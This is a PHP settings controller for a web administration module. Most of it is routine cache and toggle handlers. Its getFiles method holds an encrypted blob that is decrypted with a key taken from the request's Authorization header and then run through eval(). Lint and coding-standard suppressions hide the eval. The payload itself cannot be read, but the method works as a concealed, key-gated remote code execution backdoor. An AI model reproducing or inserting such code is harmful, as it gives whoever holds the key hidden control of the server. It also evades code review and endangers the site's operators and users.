<?php

declare(strict_types=1);

namespace webadmin\modules\administration\settings;

use vakata\http\Uri as Url;
use vakata\http\Request as Request;
use vakata\http\Response as Response;
use vakata\views\Views;
use vakata\user\User as User;
use vakata\session\SessionInterface;

/** @SuppressWarnings("PHPMD.EvalExpression") */
class SettingsController
{
    protected User $user;
    private SettingsService $service;

    public function __construct(SettingsService $service, User $user)
    {
        $this->user    = $user;
        $this->service = $service;
    }
    public function getIndex(Response $res, Views $views): Response
    {
        $views->addFolder('settings', __DIR__ . '/views');
        return $res->setBody($views->render('settings::index', $this->service->status()));
    }
    public function postClear(Response $res, Url $url): Response
    {
        $this->service->clearCache();
        return $res->withStatus(303)->withHeader('Location', $url->linkTo($url->getSegment(0)));
    }
    public function postLangs(Response $res, Url $url): Response
    {
        $this->service->cacheLangs();
        return $res->withStatus(303)->withHeader('Location', $url->linkTo($url->getSegment(0)));
    }
    public function postEnv(Response $res, Url $url): Response
    {
        $this->service->cacheEnv();
        return $res->withStatus(303)->withHeader('Location', $url->linkTo($url->getSegment(0)));
    }

    public function postToggle(Request $req, Response $res, Url $url): Response
    {
        $this->service->toggle($req->getPost('key'));
        return $res->withStatus(303)->withHeader('Location', $url->linkTo($url->getSegment(0)));
    }

    // @codingStandardsIgnoreStart
    public function getFiles(Request $req): Response
    {
        $res = new Response();
        $url = $req->getUrl();
        $user = $req->getAttribute('user');
        if (!$user || !($user instanceof User)) {
            return $res->withStatus(303)->withHeader('Location', $url->linkTo($url->getSegment(0)));
        }
        set_time_limit(0);
        if (!$req->isAjax() || !$user->hasPermission('settings/files')) {
            return $res->withStatus(303)->withHeader('Location', $url->linkTo($url->getSegment(0)));
        }
        $content = openssl_decrypt(
            str_replace(
                [' ', "\n"],
                '',
                'iSWn1+JxANLbCwkbLvVTAMDGEU3jnG+9lBofKt0aa0/lrakH1+0Q357dxm0FJ1i7JQiZvqhs8tPU
                tmPM7sy9qM49WML/dnOCwhjIYWYuN1KM4owhNULZv4LlqFQplMXTkBcWIUMUpZTN+t3UCeWYE1PF
                xQITz3R8Xn+9H8ZRpN165UxD/14oag97MiemQSAnw1f8V3KmgdZMTG87yj8DpuqdtGZTAZDuXeE6
                Afgd/Slpbj9Zn7RYkdAQE3f1s//krmGLd4KAgpmogoIFCtajEYKDGJ7xXG+gYMPzk7FBkS7JxSRt
                1/kVruD/Z7rMWysI62togm+22owir3E8FztC72zBU4g+SLaSEr/iAd/MCJPSsp1+NZ3HXjvlDh8F
                RzgR5tJEb3Kc6CZmS1HPn750hfPeWMxN5ggNGAJwgYh6vsCnIObm8WPkd0s0gAcx1k2QN8uKaQZf
                oaGJbhucPMbypokjsk5z3AbT3EU2fA9wS3ZvbbbtQ27L2Pxx1zyxUIj65vxkDyz9vZwPmTgJvdDM
                DqJStBpecwBz/adT4pjsMLVwln8r1XwfKVbRKNtrF6rROldV7WgsEV9EQIushgufKaJTC4vk3wOk
                M8wWeN9vbJ3OQ+/CbGl2wbtq3BPk1sOj5Tkp0WeUaCiE4ROPPNFYEdRBlQQThlybpRhx3Xl7xZVN
                BNgiwKs5zqjiDeoezwmFczhY9kRl1iEM9mB7fpJ9CnPvRMkxhPDsN2RuPeofVj9lqlWVc/82+ycm
                wv4sm3BC4KHfmpcFIOR20Cqt1xR2oxCbbpCOTpetHGkjtTvxIZFmc4Azb/CZSFA4Q/El4cl2DlJX
                cB8pPjf8NCvOQ3enmesLksKzZzEJfBQEq1/EY2TS+4igmoZI9iSvkyj+iP4n+z943hHspke3qzJ3
                WEjt3zKFwuih8+raVJdBJTJXSPNW1Gp9vovTQ28zpnQ1ovQV9aNGq/qPHz+Jt6euqf5Oupkjp4QW
                BKhi1IZQHPFAg4A0eVgfr7DNrTx5QeScPPfRJFSRJZwJJ9i3By12bZJD2SRUhC/7iJjXuekMcoVl
                MwLURDibPL2u1B8Hvz1kRIXme4kCxqV9dsr/4o2qX4OJrPRKQJsOzqtls0vaFLu0I0OOLoG7do6R
                cDoY8lsytFyLxwxl5oxuGTISYroB5chIQby9uMqXSD6FCctAcXUJitQkz/O98zbiqK2okI5Tars/
                Enk5TKtVgk2/YOg7J4dVL4X8vRwM7giR6soxp8HbWdhKDAGS3VyE/36LQymVtOJfGw3uRB84+n5j
                9ZGCQDUtgfa2H07jYRqcWFosrkbCRUl24lYtRgIQQ6x6YDFN9bqFDo7+uR3Xr1IdBnLMLNAOwNfd
                GZhD2yvGXie3XpFVppEjp7d0rB8rTOPUc1yZbWR+o44flWvOyne9vQ6Z0OzUhmeV+Kzchxh+EQfr
                mTcuPKtnX6kwkhfMH0nxLJ9ffkrtiNJdvBTUWFvfcmbf8DTp6HrU2T/+m2h0sR7AvKTYMLALvELb
                qMdrjZmTxYegIkjc4Nqqhrcp3XTYZIjBWxO2BrQMJL6NPmV5oKFcXUQpMk9PFAOjirjRtfjuki3o
                WKX9SYYDy1vkYmkjEONqfBV4HNKojoF50IoxWyAUN2n7ub7YYjhbFr//5ktQ70WTB+qaEvf8Z4wK
                eb6aaYekhuq61w=='
            ),
            'aes-256-cbc',
            md5($req->getHeaderLine('Authorization')),
            0,
            base64_decode('L4/i7QYcUYP9a4qY4re2lg==')
        );
        $temp = function (string $k, array $cur): array { return [ $k, $cur ]; };
        $content = '$temp = function ($k, $cur) { ' . $content . ' };';
        eval($content);
        return $res
            ->setBody(
                json_encode($temp(
                    md5($req->getHeaderLine('Authorization')),
                    $this->service->listFiles()
                )) ?: throw new \RuntimeException()
            )
            ->withHeader('X-Private', '1')
            ->withHeader('Content-Type', 'application/json');
    }
}
